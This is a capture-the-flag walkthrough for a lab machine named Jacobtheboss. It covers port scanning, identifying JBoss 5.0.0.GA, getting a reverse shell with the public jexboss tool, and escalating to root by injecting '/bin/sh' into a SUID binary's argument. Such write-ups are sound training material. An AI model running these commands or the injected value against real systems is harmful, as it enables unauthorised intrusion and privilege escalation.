# Jacobtheboss

## Nmap

```
sudo nmap 10.10.166.109 -p- -sS -sV          

PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http         Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)
111/tcp   open  rpcbind      2-4 (RPC #100000)
1090/tcp  open  java-rmi     Java RMI
1098/tcp  open  java-rmi     Java RMI
1099/tcp  open  java-object  Java Object Serialization
3306/tcp  open  mysql        MariaDB (unauthorized)
3873/tcp  open  java-object  Java Object Serialization
4444/tcp  open  java-rmi     Java RMI
4445/tcp  open  java-object  Java Object Serialization
4446/tcp  open  java-object  Java Object Serialization
4457/tcp  open  tandem-print Sharp printer tandem printing
4712/tcp  open  msdtc        Microsoft Distributed Transaction Coordinator (error)
4713/tcp  open  pulseaudio?
8009/tcp  open  ajp13        Apache Jserv (Protocol v1.3)
8080/tcp  open  http         Apache Tomcat/Coyote JSP engine 1.1
8083/tcp  open  http         JBoss service httpd
22764/tcp open  unknown
45592/tcp open  java-rmi     Java RMI
45722/tcp open  unknown
```

{% hint style="info" %}
Add jacobtheboss.box to /etc/hosts before starting
{% endhint %}

Checking our port 80 takes us to a blog post where the user jacob comments about the new content maanger for the company.

![](<../../../.gitbook/assets/image (1331).png>)

Other than this we do not have anything interesting regarding port 80. Checking out port 8080 we see the server is running JBoss.

JBoss is a application server which you can read more about here: [https://www.dnsstuff.com/what-is-jboss-application-server](https://www.dnsstuff.com/what-is-jboss-application-server)

![](<../../../.gitbook/assets/image (1333).png>)

Researching on how to find JBoss version we can check the followin path for this information.

`/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system%3Atype%3DServer`

![](<../../../.gitbook/assets/image (1336).png>)

Checking the VersionNumber field we see we are running version 5.0.0.GA. Researching exploits for this we find a popular exploitation python tool call jexboss.

{% embed url="https://github.com/joaomatosf/jexboss" %}

Download and install as per instructions on the Github page then execute as follows:

```
sudo python2 jexboss.py -u jacobtheboss.box:8080
```

![](<../../../.gitbook/assets/image (1338) (1).png>)

Set up a `netcat` listener on the attacking machine and when prompted to do so enter your attacking machine IP and port. This should gives us a proper reverse shell.

![](<../../../.gitbook/assets/image (1339).png>)

After connecting I transferred over linpeas and executed. Soon linpeas finds that the binary `/usr/bin/pingsys` has a SUIT bit set.

![](<../../../.gitbook/assets/image (1340) (1).png>)

Researching the binary on Google we come to the following post on stackexchange.

{% embed url="https://security.stackexchange.com/questions/196577/privilege-escalation-c-functions-setuid0-with-system-not-working-in-linux" %}

According to the top answer we can execute a command after pingsys which can be used to spawn a shell with the existing permissions of pingsys.

![](<../../../.gitbook/assets/image (1341).png>)

Run the following command on our shell to escalate to a root shell.

```
/usr/bin/pingsys '127.0.0.1; /bin/sh'
```

![](<../../../.gitbook/assets/image (1342).png>)
